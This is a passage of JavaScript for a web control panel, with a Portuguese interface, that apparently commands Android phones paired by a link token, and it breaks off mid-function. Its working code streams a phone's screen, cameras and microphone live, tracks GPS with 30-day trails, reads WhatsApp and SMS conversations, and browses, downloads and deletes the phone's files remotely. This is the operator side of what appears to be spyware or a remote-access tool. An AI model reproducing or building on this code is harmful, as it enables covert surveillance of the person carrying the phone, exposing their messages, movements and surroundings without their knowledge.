// Global variables
let socket = null;
let map = null;
let currentFsType = null; // 'screen' | 'front' | 'back'
let deviceMarker = null;
let deviceAccuracyCircle = null;
let trailPolylines = [];
let dayMarkers = [];
let currentDeviceId = null;
let devicesMap = new Map();
let isScreenStreaming = false;
let isCameraStreaming = false;
let activeCameraType = null; // 'front' | 'back'
let isAudioStreaming = false;
let currentStreamObjectUrl = null;
let currentCamObjectUrl = null;
let sentAudioLog = [];
let mapFollowMode = true; // Auto-center map on device GPS updates

// File browser state
let fbCurrentPath = '';
let fbHistory     = [];
let fbPreviewPending = {}; // path → { name, itemEl } — tracks pending preview requests

// Web Audio API for live PCM streaming
let audioCtx = null;
let audioNextTime = 0;
const AUDIO_SAMPLE_RATE = 16000;

// ─── Leaflet tile layers (Mapbox) ───────────────────────────────────────────
let MAPBOX_TOKEN = '';
const TILES = {
    dark: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/dark-v11/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    },
    satellite: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/satellite-v9/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    },
    roads: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/streets-v12/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    }
};

let currentTileLayer = null;
let currentMapStyle  = 'dark';

// ─── Auth helpers ─────────────────────────────────────────────────────────────
function getToken()    { return localStorage.getItem('ap_token') || ''; }
function getUsername() { return localStorage.getItem('ap_username') || ''; }
function getLinkToken(){ return localStorage.getItem('ap_linktoken') || ''; }

function authHeaders() {
    return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getToken() };
}

async function doLogout() {
    await fetch('/api/auth/logout', { method: 'POST', headers: authHeaders() }).catch(() => {});
    localStorage.removeItem('ap_token');
    localStorage.removeItem('ap_username');
    localStorage.removeItem('ap_linktoken');
    window.location.href = '/login.html';
}

function showLinkCode() {
    let popup = document.getElementById('link-code-popup');
    if (!popup) return;

    // Toggle off if already visible
    if (popup._portalOpen) {
        closeLinkCodePopup();
        return;
    }

    // Move popup to <body> as a direct child so it escapes every
    // stacking context created by backdrop-filter on the grid cards
    if (popup.parentElement !== document.body) {
        document.body.appendChild(popup);
    }

    // Position under the link button
    const btn = document.getElementById('user-link-btn');
    if (btn) {
        const r = btn.getBoundingClientRect();
        popup.style.top  = (r.bottom + 8) + 'px';
        popup.style.right = (window.innerWidth - r.right) + 'px';
        popup.style.left  = 'auto';
    }

    document.getElementById('lcp-token-val').textContent = getLinkToken() || '—';
    popup.style.display = 'block';
    popup._portalOpen = true;

    // Close on click outside
    setTimeout(() => {
        document.addEventListener('click', _lcpOutsideHandler);
    }, 60);
}

function _lcpOutsideHandler(e) {
    const popup = document.getElementById('link-code-popup');
    const btn   = document.getElementById('user-link-btn');
    if (popup && !popup.contains(e.target) && e.target !== btn && !btn?.contains(e.target)) {
        closeLinkCodePopup();
    }
}

function closeLinkCodePopup() {
    const popup = document.getElementById('link-code-popup');
    if (!popup) return;
    popup.style.display = 'none';
    popup._portalOpen   = false;
    document.removeEventListener('click', _lcpOutsideHandler);
}

function copyLinkCode() {
    const token = getLinkToken();
    if (!token) return;
    navigator.clipboard.writeText(token).then(() => {
        const btn = document.querySelector('.lcp-copy');
        if (btn) { btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!'; setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar'; }, 1500); }
    });
}

// ─── Initialize Dashboard ─────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', async () => {
    const nameEl = document.getElementById('user-name-display');
    if (nameEl) nameEl.textContent = getUsername();
    try {
        const cfgResp = await fetch('/api/config');
        if (cfgResp.ok) {
            const cfg = await cfgResp.json();
            if (cfg.mapboxToken) MAPBOX_TOKEN = cfg.mapboxToken;
        }
    } catch (e) { console.warn('Failed to load /api/config', e); }
    initMapIfReady();   // Leaflet is synchronous — init after token is loaded
    connectWebSocket();
    initMobileTabs();
    window.addEventListener('resize', () => {
        if (window.innerWidth > 767) {
            document.querySelectorAll('#dashboard-grid [data-tab]').forEach(c => {
                c.classList.remove('tab-visible');
                c.style.display = '';
            });
        } else {
            switchTab(activeTab);
        }
    });
});

// ─── Mobile Tab Navigation ───────────────────────────────────────────────────

let activeTab = 'map';

function switchTab(tab) {
    if (window.innerWidth > 767) return; // desktop: ignore tabs
    activeTab = tab;

    // Update bottom nav buttons
    document.querySelectorAll('.mbn-tab').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.tab === tab);
    });

    // Show/hide cards
    document.querySelectorAll('#dashboard-grid [data-tab]').forEach(card => {
        const match = card.dataset.tab === tab;
        card.classList.toggle('tab-visible', match);
    });

    // When switching to map tab, trigger resize so Leaflet re-renders
    if (tab === 'map' && map) {
        setTimeout(() => {
            map.invalidateSize();
            if (deviceMarker) map.panTo(deviceMarker.getLatLng());
        }, 120);
    }

    // Close sidebar if open
    closeSidebar();
}

// Initialize tabs on mobile after DOM ready
function initMobileTabs() {
    if (window.innerWidth <= 767) {
        switchTab('map');
    } else {
        // Desktop: show all cards
        document.querySelectorAll('#dashboard-grid [data-tab]').forEach(c => c.style.display = '');
    }
}

// ─── Trail History Panel ─────────────────────────────────────────────────────

let trailHistoryPoints = []; // cached points from last fetch
let trailPanelOpen = false;

function toggleTrailPanel() {
    trailPanelOpen ? closeTrailPanel() : openTrailPanel();
}

function openTrailPanel() {
    trailPanelOpen = true;
    document.getElementById('trail-panel').classList.add('open');
    renderTrailPanel();
}

function closeTrailPanel() {
    trailPanelOpen = false;
    document.getElementById('trail-panel').classList.remove('open');
}

function renderTrailPanel() {
    const list    = document.getElementById('trail-panel-list');
    const summary = document.getElementById('trail-panel-summary');

    if (trailHistoryPoints.length === 0) {
        list.innerHTML = '<div class="trail-panel-empty"><i class="fa-solid fa-route fa-2x"></i><p>Nenhum ponto ainda.</p></div>';
        summary.innerHTML = '';
        return;
    }

    // Calculate stats
    const totalKm = calcTotalDistance(trailHistoryPoints);
    const oldest  = trailHistoryPoints[0];
    const newest  = trailHistoryPoints[trailHistoryPoints.length - 1];
    const elapsed = newest.timestamp - oldest.timestamp;
    const hours   = Math.floor(elapsed / 3600000);
    const mins    = Math.floor((elapsed % 3600000) / 60000);
    const avgAcc  = Math.round(trailHistoryPoints.reduce((s,p) => s + p.accuracy, 0) / trailHistoryPoints.length);

    summary.innerHTML = `
        <div class="trail-sum-item">
            <span class="trail-sum-val">${totalKm.toFixed(2)}</span>
            <span class="trail-sum-label">km percorridos</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">${trailHistoryPoints.length}</span>
            <span class="trail-sum-label">pontos GPS</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">${hours > 0 ? hours+'h ' : ''}${mins}min</span>
            <span class="trail-sum-label">duração</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">±${avgAcc}m</span>
            <span class="trail-sum-label">precisão média</span>
        </div>
    `;

    // Render list (newest first)
    const totalDays = new Set(trailHistoryPoints.map(p => {
        const d = new Date(p.timestamp); return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
    })).size;

    list.innerHTML = '';
    const points = [...trailHistoryPoints].reverse();
    let lastDay  = null;

    points.forEach((p, idx) => {
        const d        = new Date(p.timestamp);
        const dayKey   = `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
        const ratio    = 1 - (idx / Math.max(points.length - 1, 1)); // newest=1, oldest=0
        const dotColor = interpolateTrailColor(ratio);

        // Day divider
        if (dayKey !== lastDay) {
            lastDay = dayKey;
            const divider = document.createElement('div');
            divider.style.cssText = 'padding:8px 16px 4px;font-size:.7rem;font-weight:700;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.8px;background:rgba(0,0,0,.3);';
            divider.innerHTML = `<i class="fa-solid fa-calendar-day" style="color:var(--neon-blue);margin-right:6px;"></i>${d.toLocaleDateString('pt-BR', {weekday:'long', day:'2-digit', month:'long'})}`;
            list.appendChild(divider);
        }

        const timeStr  = d.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
        const accColor = p.accuracy <= 10 ? 'var(--neon-green)' : p.accuracy <= 30 ? 'var(--neon-orange)' : 'var(--danger-red)';
        const accLabel = p.accuracy <= 10 ? 'Alta precisão (GPS)' : p.accuracy <= 50 ? 'Média precisão' : 'Baixa precisão';

        const item = document.createElement('div');
        item.className = 'trail-point-item';
        item.innerHTML = `
            <div class="trail-point-dot" style="background:${dotColor};box-shadow:0 0 5px ${dotColor}40;"></div>
            <div class="trail-point-info">
                <div class="trail-point-time">${timeStr}</div>
                <div class="trail-point-coords">${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}</div>
                <div class="trail-point-acc">
                    <span style="color:${accColor}">●</span>
                    <span style="color:${accColor}">${accLabel}</span>
                    <span style="margin-left:4px;">±${p.accuracy.toFixed(0)}m</span>
                </div>
            </div>
            <button class="trail-center-btn" onclick="panMapToPoint(${p.lat},${p.lng})" title="Ver no mapa">
                <i class="fa-solid fa-crosshairs"></i>
            </button>
        `;
        list.appendChild(item);
    });

    // Update stats in bar
    document.getElementById('trail-km').textContent = totalKm.toFixed(1);
    document.getElementById('trail-pts').textContent = trailHistoryPoints.length;
}

function panMapToPoint(lat, lng) {
    if (!map) return;
    map.setView([lat, lng], 16);
    closeTrailPanel();
    if (window.innerWidth <= 767) switchTab('map');
}

function calcTotalDistance(points) {
    let total = 0;
    for (let i = 1; i < points.length; i++) {
        total += haversineKm(points[i-1].lat, points[i-1].lng, points[i].lat, points[i].lng);
    }
    return total;
}

function haversineKm(lat1, lng1, lat2, lng2) {
    const R = 6371;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLng = (lng2 - lng1) * Math.PI / 180;
    const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLng/2)**2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
}

// ─── GPS Bar Update ───────────────────────────────────────────────────────────

let lastGpsTimestamp = 0;

function updateGpsBar(lat, lng, accuracy, timestamp) {
    const bar  = document.getElementById('map-gps-bar');
    const dot  = document.getElementById('gps-dot');
    const txt  = document.getElementById('gps-bar-text');
    if (!bar) return;

    lastGpsTimestamp = timestamp || Date.now();
    const time = new Date(lastGpsTimestamp).toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
    const accColor  = accuracy <= 10 ? 'var(--neon-green)' : accuracy <= 30 ? 'var(--neon-orange)' : 'var(--danger-red)';
    const accLabel  = accuracy <= 10 ? 'GPS Alta' : accuracy <= 30 ? 'GPS Média' : 'Rede/WiFi';

    dot.className = 'gps-dot active';
    txt.innerHTML = `<span style="color:${accColor};font-weight:700;">${accLabel}</span> ±${accuracy.toFixed(0)}m &nbsp;·&nbsp; ${time}`;

    // Stale check: mark orange after 60s without update
    clearTimeout(updateGpsBar._timer);
    updateGpsBar._timer = setTimeout(() => { if (dot) dot.className = 'gps-dot stale'; }, 60000);
}

// ─── Mobile Sidebar Drawer ────────────────────────────────────────────────────
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');
    const isOpen  = sidebar.classList.contains('open');
    isOpen ? closeSidebar() : openSidebar();
}

function openSidebar() {
    document.getElementById('sidebar').classList.add('open');
    document.getElementById('sidebar-overlay').classList.add('visible');
    document.body.style.overflow = 'hidden'; // prevent background scroll
}

function closeSidebar() {
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('sidebar-overlay').classList.remove('visible');
    document.body.style.overflow = '';
}

// ─── Leaflet Map Init ─────────────────────────────────────────────────────────

function initMap() {
    if (map) return; // already initialized

    map = L.map('map', {
        center: [-23.55052, -46.633308],
        zoom: 13,
        zoomControl: true,
        attributionControl: true
    });

    // Load dark tile layer by default
    currentTileLayer = L.tileLayer(TILES.dark.url, {
        attribution: TILES.dark.attr,
        maxZoom: 22,
        accessToken: MAPBOX_TOKEN
    }).addTo(map);

    // Disable follow mode on manual pan
    map.on('dragstart', () => {
        mapFollowMode = false;
        const btn = document.getElementById('btn-follow');
        if (btn) btn.classList.remove('active');
    });

    console.log('Leaflet map initialized (Mapbox).');
}

// Called on DOMContentLoaded (Leaflet is synchronous, no callback needed)
function initMapIfReady() {
    if (typeof L !== 'undefined' && document.getElementById('map')) {
        initMap();
    }
}

// Toggle map follow mode
function toggleFollowMode() {
    mapFollowMode = !mapFollowMode;
    const btn = document.getElementById('btn-follow');
    if (btn) btn.classList.toggle('active', mapFollowMode);
    logToConsole(mapFollowMode ? '📍 Modo seguimento ativado.' : '📍 Modo seguimento desativado.', 'system');
}

// Center map on device
function centerOnDevice() {
    if (deviceMarker && map) {
        map.setView(deviceMarker.getLatLng(), 17);
    } else if (currentDeviceId) {
        sendCommand('START_LOCATION', {});
        logToConsole('Solicitando localização atual...', 'system');
    }
}

// Switch tile layer
function setMapType(type) {
    if (!map) return;
    document.querySelectorAll('.btn-map-type').forEach(b => b.classList.remove('active'));

    let tileKey = 'dark', btnId = 'btn-map-dark', label = 'Cyber-Dark';
    if (type === 'hybrid')       { tileKey = 'satellite'; btnId = 'btn-map-satellite'; label = 'Satélite'; }
    if (type === 'roadmap_cyber'){ tileKey = 'roads';     btnId = 'btn-map-hybrid';    label = 'Ruas OSM'; }

    document.getElementById(btnId)?.classList.add('active');
    if (currentTileLayer) map.removeLayer(currentTileLayer);
    currentTileLayer = L.tileLayer(TILES[tileKey].url, {
        attribution: TILES[tileKey].attr,
        maxZoom: 22,
        accessToken: MAPBOX_TOKEN
    }).addTo(map);
    currentMapStyle = tileKey;
    logToConsole(`Mapa: ${label}`, 'system');
}

// Connect to Ktor WebSocket
function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/dashboard?token=${encodeURIComponent(getToken())}`;
    
    logToConsole('Conectando ao servidor...', 'system');
    
    socket = new WebSocket(wsUrl);
    socket.binaryType = 'arraybuffer'; // Crucial for receiving binary screen frames
    
    socket.onopen = () => {
        logToConsole('Conectado ao servidor de controle.', 'success');
    };
    
    socket.onclose = () => {
        logToConsole('Conexão perdida. Reconectando em 3 segundos...', 'error');
        // Mark all devices as offline — don't clear the list, keep them visible
        devicesMap.forEach(dev => { dev.isOnline = false; });
        renderDeviceList();
        if (currentDeviceId) {
            const dev = devicesMap.get(currentDeviceId);
            if (dev) updateActiveDeviceUI(dev);
        }
        setTimeout(connectWebSocket, 3000);
    };
    
    socket.onerror = (error) => {
        console.error('WebSocket Error: ', error);
    };
    
    socket.onmessage = (event) => {
        if (event.data instanceof ArrayBuffer) {
            handleBinaryFrame(event.data);
        } else {
            // Text frame (JSON event)
            try {
                const data = JSON.parse(event.data);
                handleJsonMessage(data);
            } catch (err) {
                console.warn('Failed to parse text message:', event.data, err);
            }
        }
    };
}

// Handle JSON events
function handleJsonMessage(data) {
    switch (data.type) {
        case 'DEVICE_LIST':
            updateDeviceList(data.devices);
            break;
            
        case 'DEVICE_CONNECTED':
            logToConsole(`Dispositivo conectado: ${data.device.model} (${data.device.deviceId})`, 'success');
            devicesMap.set(data.device.deviceId, data.device);
            renderDeviceList();
            if (!currentDeviceId) {
                selectDevice(data.device.deviceId);
            }
            break;
            
        case 'DEVICE_DISCONNECTED':
            logToConsole(`Dispositivo desconectado: ${data.deviceId}`, 'error');
            const dev = devicesMap.get(data.deviceId);
            if (dev) {
                dev.isOnline = false;
                devicesMap.set(data.deviceId, dev);
                renderDeviceList();
                if (currentDeviceId === data.deviceId) {
                    updateActiveDeviceUI(dev);
                }
            }
            break;
            
        case 'TELEMETRY':
            handleTelemetry(data);
            break;
            
        case 'PHOTO_UPLOADED':
            logToConsole(`Nova foto recebida do dispositivo!`, 'success');
            if (data.deviceId === currentDeviceId) {
                fetchMediaList(currentDeviceId);
            }
            break;
            
        case 'AUDIO_UPLOADED':
            logToConsole(`Nova gravação de áudio recebida do dispositivo!`, 'success');
            if (data.deviceId === currentDeviceId) {
                fetchMediaList(currentDeviceId);
            }
            break;

        case 'NEW_MESSAGE':
            if (data.deviceId === currentDeviceId) {
                const isOpen = currentWaAddress === (data.address || '(sistema)');
                waAddMessage(data);
                waRenderSidebar();
                if (!isOpen) {
                    const conv = conversationsMap.get(data.address || '(sistema)');
                    if (conv) { conv.unread = (conv.unread || 0) + 1; waRenderSidebar(); }
                }
            }
            const srcLabel = data.source === 'whatsapp' ? 'WhatsApp' : 'SMS';
            const srcIcon = data.source === 'whatsapp' ? '💬' : '📩';
            if (data.direction === 'in') {
                logToConsole(`${srcIcon} ${srcLabel} recebido de ${data.address || 'desconhecido'}: ${data.content}`, 'success');
            } else if (data.direction === 'out') {
                logToConsole(`📤 ${srcLabel} enviado para ${data.address || 'desconhecido'}: ${data.content}`, 'info');
            }
            break;

        case 'FILE_LIST':
            if (data.deviceId === currentDeviceId) fbRenderList(data);
            break;
        case 'FILE_LIST_ERROR':
            if (data.deviceId === currentDeviceId) fbShowError(data.error);
            break;
        case 'FILE_DELETED':
            if (data.deviceId === currentDeviceId) {
                logToConsole(`${data.success ? '✅' : '❌'} Exclusão remota: ${data.path}`, data.success ? 'success' : 'error');
                if (data.success) fbRefresh();
            }
            break;
        case 'FILE_READY':
            if (data.deviceId === currentDeviceId) {
                logToConsole(`📥 Arquivo recebido: ${data.name}`, 'success');
                fbHandleFileReady(data.name, data.url, data.originalPath);
            }
            break;

        case 'ERROR':
            logToConsole(`Erro: ${data.message}`, 'error');
            break;
            
        default:
            console.log('Unhandled JSON event:', data);
    }
}

// Route binary frames by first byte (type byte)
// 0x01 = screen JPEG | 0x02 = front cam JPEG | 0x03 = back cam JPEG | 0x04 = audio PCM
// legacy (no prefix, raw JPEG) = screen
function handleBinaryFrame(arrayBuffer) {
    const view = new Uint8Array(arrayBuffer);
    const type = view[0];

    // Legacy raw JPEG (no prefix): first byte of JPEG is 0xFF = 255
    if (type === 255 || type > 10) {
        handleScreenFrame(arrayBuffer);
        return;
    }

    const payload = arrayBuffer.slice(1);
    switch (type) {
        case 1: handleScreenFrame(payload); break;
        case 2: handleCameraFrame(payload, 'front'); break;
        case 3: handleCameraFrame(payload, 'back');  break;
        case 4: handleAudioPcmChunk(payload);        break;
        default: handleScreenFrame(arrayBuffer);
    }
}

// Handle Screen JPEG frames
function handleScreenFrame(arrayBuffer) {
    if (!isScreenStreaming || !currentDeviceId) return;

    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);

    const img = document.getElementById('screen-stream-img');
    const ph  = document.getElementById('screen-placeholder');
    if (img) { img.src = url; img.style.display = 'block'; }
    if (ph)  ph.style.display = 'none';

    // Mirror to fullscreen if active
    if (currentFsType === 'screen') updateFsFrame(url);

    if (currentStreamObjectUrl) URL.revokeObjectURL(currentStreamObjectUrl);
    currentStreamObjectUrl = url;
}

// Handle live camera JPEG frames
function handleCameraFrame(arrayBuffer, camType) {
    if (!isCameraStreaming || activeCameraType !== camType) return;

    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);

    if (camType === 'front') {
        const img = document.getElementById('cam-stream-img');
        const ph  = document.getElementById('cam-front-placeholder');
        if (img) { img.src = url; img.style.display = 'block'; }
        if (ph)  ph.style.display = 'none';
    } else {
        const img = document.getElementById('cam-back-stream-img');
        const ph  = document.getElementById('cam-back-placeholder');
        if (img) { img.src = url; img.style.display = 'block'; }
        if (ph)  ph.style.display = 'none';
    }

    // Mirror to fullscreen if active
    if (currentFsType === camType) updateFsFrame(url);

    if (currentCamObjectUrl) URL.revokeObjectURL(currentCamObjectUrl);
    currentCamObjectUrl = url;
}

// Handle live PCM audio chunks (Int16, 16kHz, mono)
function handleAudioPcmChunk(arrayBuffer) {
    if (!isAudioStreaming) return;
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: AUDIO_SAMPLE_RATE });
        audioNextTime = audioCtx.currentTime + 0.1;
    }
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const int16 = new Int16Array(arrayBuffer);
    const float32 = new Float32Array(int16.length);
    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;

    const buffer = audioCtx.createBuffer(1, float32.length, AUDIO_SAMPLE_RATE);
    buffer.copyToChannel(float32, 0);

    const src = audioCtx.createBufferSource();
    src.buffer = buffer;
    src.connect(audioCtx.destination);

    const now = audioCtx.currentTime;
    const start = Math.max(audioNextTime, now);
    src.start(start);
    audioNextTime = start + buffer.duration;
}

// Toggle camera stream on/off
function toggleCameraStream(cam) {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isCameraStreaming && activeCameraType === cam) {
        sendCommand('STOP_CAMERA_STREAM');
        stopLocalCameraUI();
    } else {
        if (isCameraStreaming) sendCommand('STOP_CAMERA_STREAM');
        sendCommand('START_CAMERA_STREAM', { camera: cam });
        isCameraStreaming = true;
        activeCameraType  = cam;

        // Show live badge on the correct panel
        const frontBadge = document.getElementById('cam-front-badge');
        const backBadge  = document.getElementById('cam-back-badge');
        if (frontBadge) frontBadge.style.display = cam === 'front' ? 'inline-flex' : 'none';
        if (backBadge)  backBadge.style.display  = cam === 'back'  ? 'inline-flex' : 'none';

        // Update control button icon
        const icon = document.getElementById(cam === 'front' ? 'sc-front-icon' : 'sc-back-icon');
        if (icon) icon.className = 'fa-solid fa-stop';
    }
}

function stopLocalCameraUI() {
    isCameraStreaming = false;
    activeCameraType  = null;

    // Hide both stream images and show placeholders
    ['cam-stream-img', 'cam-back-stream-img'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.src = ''; el.style.display = 'none'; }
    });
    ['cam-front-placeholder', 'cam-back-placeholder'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'flex';
    });

    // Hide live badges
    ['cam-front-badge', 'cam-back-badge'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });

    // Reset control icons
    ['sc-front-icon', 'sc-back-icon'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.className = 'fa-solid fa-play';
    });

    if (currentCamObjectUrl) { URL.revokeObjectURL(currentCamObjectUrl); currentCamObjectUrl = null; }
}

// Toggle live audio stream on/off
function toggleAudioStream() {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isAudioStreaming) {
        sendCommand('STOP_AUDIO_STREAM');
        isAudioStreaming = false;
        if (audioCtx) { audioCtx.close(); audioCtx = null; }
        const icon = document.getElementById('btn-audio-live-icon');
        const txt  = document.getElementById('btn-audio-live-txt');
        if (icon) icon.className = 'fa-solid fa-headphones';
        if (txt)  txt.textContent = 'Ouvir Ao Vivo';
        const badge = document.getElementById('cam-audio-badge');
        if (badge) badge.style.display = 'none';
    } else {
        sendCommand('START_AUDIO_STREAM');
        isAudioStreaming = true;
        const icon = document.getElementById('btn-audio-live-icon');
        const txt  = document.getElementById('btn-audio-live-txt');
        if (icon) icon.className = 'fa-solid fa-headphones fa-beat';
        if (txt)  txt.textContent = '⏹ Parar Áudio Live';
        const badge = document.getElementById('cam-audio-badge');
        if (badge) badge.style.display = 'inline-block';
    }
}

// Handle Device List updates
function updateDeviceList(devices) {
    // Merge: update existing entries, add new ones — never delete (keeps offline devices visible)
    devices.forEach(d => {
        const existing = devicesMap.get(d.deviceId);
        if (existing) {
            // Preserve locally-known telemetry if server sends defaults
            devicesMap.set(d.deviceId, { ...existing, ...d });
        } else {
            devicesMap.set(d.deviceId, d);
        }
    });

    renderDeviceList();

    // Update status bar if selected device is in this list
    if (currentDeviceId) {
        const dev = devicesMap.get(currentDeviceId);
        if (dev) updateActiveDeviceUI(dev);
    }

    // Auto select first device if none is selected
    if (devices.length > 0 && !currentDeviceId) {
        selectDevice(devices[0].deviceId);
    }
}

// Render Devices list in sidebar
function renderDeviceList() {
    const listContainer = document.getElementById('device-list');
    const noDevicesMsg = document.getElementById('no-devices');
    
    listContainer.innerHTML = '';
    
    if (devicesMap.size === 0) {
        noDevicesMsg.style.display = 'block';
        return;
    }
    
    noDevicesMsg.style.display = 'none';
    
    devicesMap.forEach(device => {
        const li = document.createElement('li');
        li.className = `device-item ${device.deviceId === currentDeviceId ? 'active' : ''}`;
        li.onclick = () => selectDevice(device.deviceId);
        
        li.innerHTML = `
            <div class="device-info-left">
                <span class="device-item-name">${device.model}</span>
                <span class="device-item-model">${device.deviceId}</span>
            </div>
            <div class="device-status-dot ${device.isOnline ? 'online' : 'offline'}"></div>
        `;
        listContainer.appendChild(li);
    });
}

// Select a device to control
function selectDevice(deviceId) {
    currentDeviceId = deviceId;

    renderDeviceList();

    const device = devicesMap.get(deviceId);
    if (device) {
        updateActiveDeviceUI(device);
        fetchMediaList(deviceId);
        stopLocalScreenUI();
        stopLocalCameraUI();
        if (isAudioStreaming) toggleAudioStream();
        fetchDeviceHistory(deviceId);

        // Auto-request GPS immediately when device is online
        if (device.isOnline) {
            setTimeout(() => sendCommand('START_LOCATION', {}), 800);
        }
    }

    if (window.innerWidth <= 767) closeSidebar();
}

// Update Top Bar & Status of selected device
function updateActiveDeviceUI(device) {
    document.getElementById('current-device-name').textContent = device.model;
    const badge = document.getElementById('current-device-status');
    
    badge.className = `status-badge ${device.isOnline ? 'online' : 'offline'}`;
    badge.textContent = device.isOnline ? 'ONLINE' : 'OFFLINE';
    
    const telemetry = document.getElementById('device-telemetry');
    if (device.isOnline) {
        telemetry.style.display = 'flex';
        updateBatteryUI(device.battery || 100, device.isCharging || false);
    } else {
        telemetry.style.display = 'none';
    }
}

// Update Battery status
function updateBatteryUI(level, isCharging) {
    const batteryLevel = document.getElementById('battery-level');
    const batteryIcon = document.getElementById('battery-icon');
    
    batteryLevel.textContent = `${level}%`;
    
    // Adjust battery icons
    batteryIcon.className = 'fa-solid ';
    if (isCharging) {
        batteryIcon.className += 'fa-battery-bolt neon-text-blue';
    } else if (level > 85) {
        batteryIcon.className += 'fa-battery-full';
    } else if (level > 60) {
        batteryIcon.className += 'fa-battery-three-quarters';
    } else if (level > 35) {
        batteryIcon.className += 'fa-battery-half';
    } else if (level > 15) {
        batteryIcon.className += 'fa-battery-quarter';
    } else {
        batteryIcon.className += 'fa-battery-empty neon-text-pink fa-shake';
    }
}

// Fetch historical events and locations from Database
function fetchDeviceHistory(deviceId) {
    // 1. Fetch Logs History
    fetch(`/api/device/${deviceId}/logs-history`, { headers: authHeaders() })
        .then(res => res.json())
        .then(logs => {
            clearConsole();
            logs.forEach(log => {
                const time = new Date(log.timestamp).toLocaleTimeString('pt-BR');
                const consoleBody = document.getElementById('terminal-body');
                if (consoleBody) {
                    const line = document.createElement('div');
                    line.className = `terminal-line ${log.type}`;
                    line.innerHTML = `<span class="timestamp">[${time}]</span> ${escapeHtml(log.message)}`;
                    consoleBody.appendChild(line);
                }
            });
            const consoleBody = document.getElementById('terminal-body');
            if (consoleBody) consoleBody.scrollTop = consoleBody.scrollHeight;
            logToConsole(`Histórico de logs carregado (${logs.length} eventos).`, 'system');
        })
        .catch(err => console.error('Error fetching logs history:', err));

    // 2. Fetch 30-day Trail
    fetchTrailHistory(deviceId);

    // 3. Fetch Messages History
    conversationsMap.clear();
    currentWaAddress = null;
    const waMsgPane = document.getElementById('wa-messages');
    if (waMsgPane) waMsgPane.innerHTML = '<div class="wa-no-conv"><i class="fa-solid fa-comments fa-3x"></i><p>Selecione uma conversa à esquerda</p></div>';
    const waFooter = document.getElementById('wa-footer');
    if (waFooter) waFooter.style.display = 'none';

    fetch(`/api/device/${deviceId}/messages-history`, { headers: authHeaders() })
        .then(res => res.json())
        .then(messages => {
            document.getElementById('messages-device-label').textContent =
                devicesMap.get(deviceId)?.model || deviceId;
            messages.forEach(m => waIngestMessage(m));
            waRenderSidebar();
            // Auto-select most recent conversation
            const sorted = [...conversationsMap.entries()].sort((a,b) => b[1].lastTime - a[1].lastTime);
            if (sorted.length > 0) waSelectConversation(sorted[0][0]);
        })
        .catch(err => console.error('Error fetching messages:', err));
}

// Fetch and draw trail for selected days
function fetchTrailHistory(deviceId) {
    if (!deviceId) return;
    const days = document.getElementById('trail-days-select')?.value || 30;

    fetch(`/api/device/${deviceId}/telemetry-history?days=${days}`, { headers: authHeaders() })
        .then(res => res.json())
        .then(points => {
            trailHistoryPoints = points; // cache for trail history panel

            // Update trail stats bar (mobile)
            const km = points.length >= 2 ? calcTotalDistance(points).toFixed(1) : '--';
            const kEl = document.getElementById('trail-km');
            const pEl = document.getElementById('trail-pts');
            if (kEl) kEl.textContent = km;
            if (pEl) pEl.textContent = points.length;

            clearTrail();

            if (!map) return;

            if (points.length === 0) {
                document.getElementById('location-accuracy').textContent = 'Precisão: --';
                return;
            }

            logToConsole(`Rastro carregado: ${points.length} pontos (últimos ${days} dias).`, 'system');

            // Group points by calendar day for color-coded segments
            const dayGroups = groupPointsByDay(points);
            const totalDays = dayGroups.length;

            dayGroups.forEach((group, idx) => {
                if (group.coords.length < 2) return;

                const ratio   = totalDays <= 1 ? 1 : idx / (totalDays - 1);
                const color   = interpolateTrailColor(ratio);
